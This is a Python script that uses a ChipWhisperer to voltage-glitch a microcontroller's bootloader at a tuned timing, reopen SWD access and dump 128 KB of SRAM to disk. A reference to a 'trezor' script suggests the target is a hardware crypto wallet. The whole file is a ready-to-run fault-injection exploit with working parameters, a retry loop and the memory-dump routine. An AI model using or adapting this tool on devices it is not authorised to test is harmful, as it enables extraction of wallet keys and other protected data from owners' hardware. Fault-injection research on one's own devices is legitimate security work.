#!/usr/bin/env python3
"""
Bootloader-bypass glitch (tio4 / reset trigger) then dump SRAM.

Anchored on the known-good timing from the glitch_campaign logs:
ext_offset=17000 (170.0us after reset) produced the SWD-open success.

Each attempt fires that glitch, waits for boot, then tries to read SRAM
(0x20000000). SRAM only answers once the bootloader bypass has left SWD/SRAM
open, so a successful read IS the success oracle. On the first good read we
immediately dump SRAM over the SAME connection (no reset in between) and stop.

Crowbar is torn down on exit / Ctrl+C. Non-interactive: no espeak/keypress loop.
"""
import os, sys, time, signal, atexit
import chipwhisperer as cw

SRAM_BASE    = 0x20000000
PROBE_LEN    = 256
DUMP_SIZE    = int(os.environ.get("DUMP_SIZE", 0x20000))   # 128 KB
STEP         = int(os.environ.get("STEP", 256))
EXT_OFFSET   = int(os.environ.get("EXT_OFFSET", 17000))
EXT_SPAN     = int(os.environ.get("EXT_SPAN", 2))          # scan 17000..17002
MAX_ATTEMPTS = int(os.environ.get("MAX_ATTEMPTS", 80))
OUTDIR       = f"SRAM_{time.strftime('%Y%m%d_%H%M%S')}"

def usb_reset_stlink():
    os.system("/home/tdaly/.cwvenv/usb_reset > /dev/null 2>&1")

# ---- scope / glitch (same proven config as 1-trezor_fun.py) -----------------
scope = cw.scope()
scope.io.target_pwr = "high_z"
scope.clock.clkgen_freq  = 100e6
scope.trigger.triggers   = "tio4"
scope.glitch.clk_src     = "clkgen"
scope.glitch.output      = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20
scope.glitch.width  = 40
scope.glitch.offset = -45

def reboot_flush():
    scope.io.target_pwr = False
    scope.io.nrst = False
    scope.arm()
    scope.io.nrst = "high_z"
    scope.io.target_pwr = True

_torn = False
def teardown(*_):
    global _torn
    if _torn: return
    _torn = True
    for a, v in (("glitch_hp", False), ("glitch_lp", False),
                 ("target_pwr", False), ("nrst", "high_z")):
        try: setattr(scope.io, a, v)
        except Exception: pass
    try: scope.dis()
    except Exception: pass
atexit.register(teardown)
def _sig(*_):
    print("\n⚠ interrupt -> teardown (crowbar off)"); teardown(); sys.exit(0)
signal.signal(signal.SIGINT, _sig)
signal.signal(signal.SIGTERM, _sig)

def glitch_and_probe(eo):
    """Fire the glitch at ext_offset eo, then try to read SRAM. Returns dev or None."""
    scope.glitch.ext_offset = eo
    reboot_flush()
    time.sleep(2)                       # let the bootloader run to the bypass point
    scope.io.glitch_hp = False; scope.io.glitch_hp = True
    scope.io.glitch_lp = False; scope.io.glitch_lp = True
    try:
        import swd
        usb_reset_stlink(); time.sleep(0.4)
        dev = swd.Swd()
        data = bytes(dev.read_mem(SRAM_BASE, PROBE_LEN))
        if len(data) == PROBE_LEN:
            return dev, data
    except Exception:
        pass
    return None, None

print("=" * 60)
print("Bootloader-bypass glitch  ->  SRAM dump")
print(f"  ext_offset {EXT_OFFSET}..{EXT_OFFSET+EXT_SPAN}  width=40 offset=-45 repeat=20")
print(f"  probe SRAM 0x{SRAM_BASE:08X}, dump {DUMP_SIZE} bytes on success")
print(f"  max attempts {MAX_ATTEMPTS}")
print("=" * 60)

reboot_flush()
hit = None
attempt = 0
while attempt < MAX_ATTEMPTS and hit is None:
    for eo in range(EXT_OFFSET, EXT_OFFSET + EXT_SPAN + 1):
        attempt += 1
        dev, data = glitch_and_probe(eo)
        if dev is not None:
            print(f"\n💥 SRAM READABLE after glitch @ ext_offset={eo} (attempt {attempt})")
            print(f"   first 64 bytes: {data[:64].hex()}")
            hit = (dev, eo)
            break
        print(f"  attempt {attempt:3d}  eo={eo}  -> no SRAM", flush=True)
        if attempt >= MAX_ATTEMPTS:
            break
        time.sleep(0.1)

if hit is None:
    print("\nNo SRAM access landed this run. Re-run, widen EXT_SPAN, or raise MAX_ATTEMPTS.")
    sys.exit(0)

# ---- dump SRAM over the SAME open connection (do NOT reset) ------------------
dev, eo = hit
os.makedirs(OUTDIR, exist_ok=True)
path = os.path.join(OUTDIR, "sram_0x20000000.bin")
dump = bytearray()
addr = SRAM_BASE
print(f"\nDumping SRAM -> {path}")
while addr < SRAM_BASE + DUMP_SIZE:
    try:
        dump += bytes(dev.read_mem(addr, STEP))
        addr += STEP
    except Exception as e:
        print(f"  connection lost at 0x{addr:08X}: {str(e)[:50]}")
        break

with open(path, "wb") as f:
    f.write(dump)
nz = sum(1 for b in dump if b not in (0, 0xFF))
print(f"✓ dumped {len(dump)} bytes ({addr-SRAM_BASE} of SRAM) -> {path}")
print(f"  non-trivial bytes: {nz}/{len(dump)}")
print(f"  ext_offset that worked: {eo}")
